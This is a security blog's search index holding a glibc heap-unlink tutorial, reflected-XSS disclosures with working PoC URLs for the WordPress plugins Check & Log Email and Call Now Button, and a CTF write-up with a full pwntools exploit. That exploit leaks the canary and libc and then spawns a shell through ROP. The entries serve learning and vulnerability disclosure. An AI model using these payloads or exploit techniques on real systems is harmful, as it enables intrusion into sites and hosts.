<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>unlink</title>
    <link href="/2022/06/21/unlink/"/>
    <url>/2022/06/21/unlink/</url>
    
    <content type="html"><![CDATA[<h1 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h1><h2 id="释放堆"><a href="#释放堆" class="headerlink" title="释放堆"></a>释放堆</h2><p>释放堆时会检查相邻地址的chunk是否处于空闲状态，若是就会合并这两个chunk。合并时会进行unlink操作，将相邻地址的chunk进行unlink解链操作从bins中拿出来。</p><p><strong>堆合并分为向前合并和向后合并。</strong></p><ul><li>向后合并指的是在释放P时和他的pre_chunk合并（也就是相邻小地址的chunk）</li><li>向前合并指的是在释放P时和他的next_chunk合并（也就是相邻大地址的chunk）</li></ul><h2 id="Unlink的流程"><a href="#Unlink的流程" class="headerlink" title="Unlink的流程"></a>Unlink的流程</h2><figure class="highlight xl"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><pre><code class="hljs xl">#define unlink(AV, P, BK, FD) &#123;<br>            <span class="hljs-keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="hljs-number">0</span>))<br>              malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);<br>            FD = P-&gt;fd;<br>            BK = P-&gt;bk;<br>            <span class="hljs-function"><span class="hljs-title">if</span> (__builtin_expect (FD-&gt;</span><span class="hljs-function"><span class="hljs-title">bk</span> != P || BK-&gt;</span>fd != P, <span class="hljs-number">0</span>))<br>              malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list&quot;</span>);<br>            <span class="hljs-keyword">else</span> &#123;<br>                FD-&gt;bk = BK;<br>                BK-&gt;fd = FD;<br>                <span class="hljs-keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))<br>                    &amp;&amp; __<span class="hljs-function"><span class="hljs-title">builtin_expect</span> (P-&gt;</span>fd_nextsize != NULL, <span class="hljs-number">0</span>)) &#123;<br>                    <span class="hljs-function"><span class="hljs-title">if</span> (__builtin_expect (P-&gt;</span><span class="hljs-function"><span class="hljs-title">fd_nextsize</span>-&gt;</span>bk_nextsize != P, <span class="hljs-number">0</span>)<br>                        || __<span class="hljs-function"><span class="hljs-title">builtin_expect</span> (P-&gt;</span><span class="hljs-function"><span class="hljs-title">bk_nextsize</span>-&gt;</span>fd_nextsize != P, <span class="hljs-number">0</span>))<br>                      malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>);<br>                    <span class="hljs-function"><span class="hljs-title">if</span> (FD-&gt;</span>fd_nextsize == NULL) &#123;<br>                        <span class="hljs-function"><span class="hljs-title">if</span> (P-&gt;</span>fd_nextsize == P)<br>                          FD-&gt;<span class="hljs-function"><span class="hljs-title">fd_nextsize</span> = FD-&gt;</span>bk_nextsize = FD;<br>                        <span class="hljs-keyword">else</span> &#123;<br>                            FD-&gt;<span class="hljs-function"><span class="hljs-title">fd_nextsize</span> = P-&gt;</span>fd_nextsize;<br>                            FD-&gt;<span class="hljs-function"><span class="hljs-title">bk_nextsize</span> = P-&gt;</span>bk_nextsize;<br>                            P-&gt;<span class="hljs-function"><span class="hljs-title">fd_nextsize</span>-&gt;</span>bk_nextsize = FD;<br>                            P-&gt;<span class="hljs-function"><span class="hljs-title">bk_nextsize</span>-&gt;</span>fd_nextsize = FD;<br>                          &#125;<br>                      &#125; <span class="hljs-keyword">else</span> &#123;<br>                        P-&gt;<span class="hljs-function"><span class="hljs-title">fd_nextsize</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">bk_nextsize</span> = P-&gt;</span>bk_nextsize;<br>                        P-&gt;<span class="hljs-function"><span class="hljs-title">bk_nextsize</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">fd_nextsize</span> = P-&gt;</span>fd_nextsize;<br>                      &#125;                         &#125;<br>              &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><p>(代码来源于<a href="https://lantern.cool/note-pwn-unlink/">这里</a>)<br>首先会检查当前chunk的大小是否和相邻next_chunk的pre_size的大小进行比较。然后会检查<code>FD-&gt;bk == P || BK-&gt;fd == P</code>。</p><p>因此想要执行unlink攻击，需要设置fake free chunk的size字段和相邻next_chunk的pre_size大小相同。并且需要设置<code>P-&gt;fd = ptr - 0x18</code> <code>P-&gt;bk = ptr - 0x10</code>来绕过第二个检查。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">FD</span> <span class="hljs-operator">=</span> P-&gt;fd <span class="hljs-operator">=</span> ptr - <span class="hljs-number">0</span>x18<br><span class="hljs-attribute">BK</span> <span class="hljs-operator">=</span> P-&gt;bk <span class="hljs-operator">=</span> ptr - <span class="hljs-number">0</span>x10<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/2o2ecAL.png"></p><p>因此</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">BK</span>-&gt;fd = ptr - <span class="hljs-number">0</span>x10 + <span class="hljs-number">0</span>x10 = ptr<br><span class="hljs-attribute">FD</span>-&gt;bk = ptr - <span class="hljs-number">0</span>x18 + <span class="hljs-number">0</span>x18 = ptr<br></code></pre></td></tr></table></figure><p>可绕过检查。<br>解链后，<code>FD-&gt;bk = BK</code>即<code>*ptr = ptr - 0x10</code>, <code>BK-&gt;fd=FD</code>即<code>*ptr = ptr - 0x18</code>。</p><p>unlink 后，对 ptr 指向的内存进行写入，如 <code>‘A’*0x18 + free@got</code>, 使得 ptr 指向 <code>free@got</code>, 再次对 ptr 指向的内存进行写入，可以把 <code>free@got</code> 修改为 <code>system</code> 的地址，之后调用 <code>free</code> 可任意命令执行。</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>这里用到的例子是<a href="https://github.com/shellphish/how2heap">how2heap</a>中的<a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.31/unsafe_unlink.c">unsafe_unlink</a></p><p>首先<code>gcc unsafe_unlink.c -o unsafe_unlink -g</code>编译，然后gdb调试。<br>chunk0_ptr是全局指针变量，在这里是为了伪造和chunk1_ptr相邻且已经free的chunk，因此在<code>free(chunk1_ptr)</code>时就会触发fake chunk的unlink操作。</p><p><img src="https://i.imgur.com/fvLIQxT.png"><br>这段代码是为了伪造fake chunk，绕过上面提到的检查。</p><p><img src="https://i.imgur.com/9rm9aI8.png"><br>这段代码是为了修改chunk1_ptr的chunk头部来使chunk1的prev_size字段值等于fake chunk的大小并且prev_inuse字段为0来使fake chunk为空闲状态。</p><p>我们用gdb调试，可以看到chunk0和chunk1两个chunk<br><img src="https://i.imgur.com/hIs2t6A.png"></p><p>然后填充chunk0中的fake chunk<br><img src="https://i.imgur.com/jYVFTsy.png"></p><p>然后伪造chunk1的prev_size位和prev_inuse位<br><img src="https://i.imgur.com/g4d4e2s.png"><br>之后<code>free(chunk1_ptr)</code>就会使fake chunk触发unlink操作，使得chunk0_ptr指针指向<em>chunk0_ptr[2]，也就是&amp;chunk0_ptr - 0x18<br><img src="https://i.imgur.com/fxmSrmF.png"><br>此时让chunk0_ptr[3] &#x3D; victim_string，也就是</em>（chunk0_ptr + 0x18） &#x3D; *(&amp;chunk0_ptr - 0x18 + 0x18) &#x3D; chunk0_ptr &#x3D; victim_string<br><img src="https://i.imgur.com/vvmINxX.png"><br>可能画个图好理解一点</p><p><img src="https://i.imgur.com/bn72gva.png"></p><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><p>在这里说一下为什么chunk0_ptr[2]要填&amp;chunk0_ptr-0x18，前面为什么要加取址符？<br>是因为在检查时，会检查<code>FD-&gt;bk == P</code>,即*((p-&gt;fd)+0x18)&#x3D;&#x3D;p，也就是FD指针+0x18的位置所填的内容应该是p,如果chunk0_ptr[2]也就是p-&gt;fd填的是p-0x18的话，左边&#x3D;p!&#x3D;p&#x3D;右边,所以这里需要填的应该是&amp;chunk0_ptr-0x18</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://lantern.cool/note-pwn-unlink/">Unlink</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>unlink</title>
    <link href="/2022/06/21/unlinkorigin/"/>
    <url>/2022/06/21/unlinkorigin/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>wp_check_email</title>
    <link href="/2022/04/22/wp-check-email/"/>
    <url>/2022/04/22/wp-check-email/</url>
    
    <content type="html"><![CDATA[<h1 id="Check-amp-Log-email-lt-x3D-1-0-5-Reflected-XSS"><a href="#Check-amp-Log-email-lt-x3D-1-0-5-Reflected-XSS" class="headerlink" title="Check &amp; Log email &lt;&#x3D; 1.0.5 Reflected XSS"></a>Check &amp; Log email &lt;&#x3D; 1.0.5 Reflected XSS</h1><p>In file <code>check-email\include\Core\UI\Page\Check_Email_Settings_Page.php</code> <code>$_GET[&#39;tab&#39;]</code>does not sanitized and leading a Reflected XSS.</p><p><img src="/2022/04/22/wp-check-email/1.png"></p><p>POC:</p><figure class="highlight awk"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/wp-admin/</span>admin.php?page=check-email-settings&amp;tab=<span class="hljs-string">&quot;&gt; &lt;input type=&quot;</span>text<span class="hljs-string">&quot; name=&quot;</span>test<span class="hljs-string">&quot; value=&quot;</span>xxxxx<span class="hljs-string">&quot; onmouseover=alert(1) test=&quot;</span><span class="hljs-string">&quot;/</span><br></code></pre></td></tr></table></figure><p><img src="/2022/04/22/wp-check-email/2.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>wp_call_now_button</title>
    <link href="/2022/04/22/wp-call-now-button/"/>
    <url>/2022/04/22/wp-call-now-button/</url>
    
    <content type="html"><![CDATA[<h1 id="call-now-button-lt-x3D-1-1-1-Reflected-XSS"><a href="#call-now-button-lt-x3D-1-1-1-Reflected-XSS" class="headerlink" title="call now button &lt;&#x3D; 1.1.1 Reflected XSS"></a>call now button &lt;&#x3D; 1.1.1 Reflected XSS</h1><p>In file <code>/call-now-button/src/admin/action/CnbActionViewEdit.php</code> <code>$_REQUEST[&quot;bid&quot;]</code>does not sanitized properly and leading a Reflected XSS.</p><p><img src="/2022/04/22/wp-call-now-button/1.png"></p><p>And <code>$button-&gt;type = &#39;SINGLE&#39; </code>defaultly.</p><p><img src="/2022/04/22/wp-call-now-button/2.png"></p><p>If we want to trigger this xss, we need activate premium first, it’s for free.</p><p><img src="/2022/04/22/wp-call-now-button/3.png"> </p><p>POC:</p><p>According to <a href="https://portswigger.net/research/xss-in-hidden-input-fields">this article</a>, To trigger this xss we need press Shift + Alt + X in windows or Ctrl + Alt + X In macos.</p><figure class="highlight awk"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/wp-admin/</span>admin.php?page=call-now-button&amp;bid=xxxxx<span class="hljs-string">&quot; accesskey=X onclick=alert(1) test=&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/04/22/wp-call-now-button/4.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2022虎符babygame</title>
    <link href="/2022/04/06/2022%E8%99%8E%E7%AC%A6babygame/"/>
    <url>/2022/04/06/2022%E8%99%8E%E7%AC%A6babygame/</url>
    
    <content type="html"><![CDATA[<p>比赛中没写出来，照着别人的wp复现了一下，记录下一些知识点。</p><p>题目还算是常规的那种，可以很明显看到漏洞是栈溢出和格式化字符串漏洞。</p><p><img src="/2022/04/06/2022%E8%99%8E%E7%AC%A6babygame/2022-04-04_224726.png"></p><p>首先是栈溢出为猜数游戏设置种子，并且泄露出canary的值。<br>然后通过猜数游戏（CDLL库可自行百度），进入13E7函数，</p><p>格式化字符串泄露出libcbase和elfbase，并且将ret addr改为sub_13E7函数，重新进入sub_13E7函数。</p><p><img src="/2022/04/06/2022%E8%99%8E%E7%AC%A6babygame/2022-04-05_173926.png"></p><p>此时将ret addr改为main函数，再用利用main函数中的栈溢出漏洞写入rop链，最后拿到shell。</p><p>rop链要加ret的原因是栈未对齐<br><img src="/2022/04/06/2022%E8%99%8E%E7%AC%A6babygame/2022-04-05_174749.png"></p><p>可以看到，红框的语句的作用是检查rsp+0x50是否是0x10的倍数，显然不是，因此要加ret。</p><p>EXP：</p><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">from</span> ctypes import cdll, CDLL<br><br><br><span class="hljs-attribute">context</span>.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-attribute">p</span> = process(&#x27;./babygame&#x27;)<br><br><span class="hljs-comment">#cmd = &quot;b *%d\n&quot; %(base+0x141c)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br><br><br><span class="hljs-attribute">base</span> = p.libs()[<span class="hljs-string">&quot;/hufu/babygame/37ae6078e4e24dcc8196e39efbe8c0bc/37ae6078e4e24dcc8196e39efbe8c0bc/babygame&quot;</span>]<br><br><span class="hljs-attribute">cmd</span> = <span class="hljs-string">&quot;b *%d\n&quot;</span> %(base+<span class="hljs-number">0</span>x1449)<br><span class="hljs-attribute">gdb</span>.attach(p, cmd)<br><br><br><span class="hljs-attribute">name</span> = b<span class="hljs-string">&quot;b&quot;</span>*<span class="hljs-number">0</span>x100+p64(<span class="hljs-number">0</span>x6161616161616161)+b<span class="hljs-string">&quot;a&quot;</span><br><br><span class="hljs-attribute">p</span>.sendafter(<span class="hljs-string">&quot; your name:\n&quot;</span>, name)<br><br><span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">9</span>)<br><br><span class="hljs-attribute">canary</span> = u64(b<span class="hljs-string">&quot;\x00&quot;</span>+p.recv(<span class="hljs-number">7</span>))<br><br><span class="hljs-attribute">rbp</span> = u64(p.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, b<span class="hljs-string">&quot;\x00&quot;</span>))<br><span class="hljs-comment">#print(hex(canary))</span><br><br><span class="hljs-comment">#success(hex(canary))</span><br><span class="hljs-comment">#success(hex(rbp))</span><br><br><span class="hljs-attribute">libc</span> = CDLL(<span class="hljs-string">&quot;libc-2.31.so&quot;</span>)<br><span class="hljs-attribute">libc</span>.srand(<span class="hljs-number">0</span>x6161616161616161)<br><br><br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">100</span>):<br>    <span class="hljs-attribute">p</span>.sendlineafter(<span class="hljs-string">&quot; \n&quot;</span>, str((libc.rand()+<span class="hljs-number">1</span>)%<span class="hljs-number">3</span>))<br><br><br><span class="hljs-comment">#cmd = &quot;b *%d\n&quot; %(base+0x141c)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br><br><span class="hljs-attribute">payload</span> = b<span class="hljs-string">&quot;%62c%9$hhn&quot;</span><br><span class="hljs-attribute">payload</span> += b<span class="hljs-string">&quot;q%79$p&quot;</span><br><span class="hljs-attribute">payload</span> += b<span class="hljs-string">&quot;ff%83$pl&quot;</span><br><span class="hljs-attribute">payload</span> += p64(rbp-<span class="hljs-number">0</span>x218)<br><span class="hljs-attribute">p</span>.sendafter(&#x27;Good luck to you.\n&#x27;, payload)<br><br><span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;q&quot;</span>)<br><span class="hljs-attribute">leak</span> = int(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>)<br><span class="hljs-attribute">libc_base</span>= leak - <span class="hljs-number">0</span>x240b3<br><span class="hljs-comment">#success(hex(leak))</span><br><span class="hljs-comment">#success(hex(libc_base))</span><br><br><br><span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;ff&quot;</span>)<br><span class="hljs-attribute">elf_base</span> = int(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0</span>x1465<br><span class="hljs-comment">#success(hex(elf_base))</span><br><br><span class="hljs-attribute">target</span> = (elf_base+<span class="hljs-number">0</span>x148e)&amp;<span class="hljs-number">0</span>xffff<br><span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;%&#123;&#125;c%9$hn&quot;</span>.format(target).encode()<br><span class="hljs-attribute">payload</span> = payload.ljust(<span class="hljs-number">0</span>x10, b&#x27;a&#x27;)<br><span class="hljs-attribute">payload</span> += p64(rbp-<span class="hljs-number">0</span>x218)<br><br><span class="hljs-attribute">p</span>.sendafter(&#x27;Good luck to you.\n&#x27;, payload)<br><br><span class="hljs-attribute">payload2</span> = b&#x27;q&#x27;*<span class="hljs-number">0</span>x108+p64(canary)+b<span class="hljs-string">&quot;b&quot;</span>*<span class="hljs-number">0</span>x18<br><br><span class="hljs-attribute">pop_rdi_ret</span> = libc_base + <span class="hljs-number">0</span>x0000000000023b72<br><span class="hljs-attribute">bin_sh</span> = libc_base + <span class="hljs-number">0</span>x1b45bd<br><span class="hljs-attribute">system_addr</span> = libc_base + <span class="hljs-number">0</span>x522c0<br><span class="hljs-attribute">ret</span> = elf_base + <span class="hljs-number">0</span>x1565<br><br><span class="hljs-attribute">payload2</span> += p64(pop_rdi_ret) + p64(bin_sh) + p64(ret) + p64(system_addr)<br><br><span class="hljs-attribute">p</span>.sendafter(<span class="hljs-string">&quot; your name:\n&quot;</span>, payload2)<br><br><span class="hljs-attribute">p</span>.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
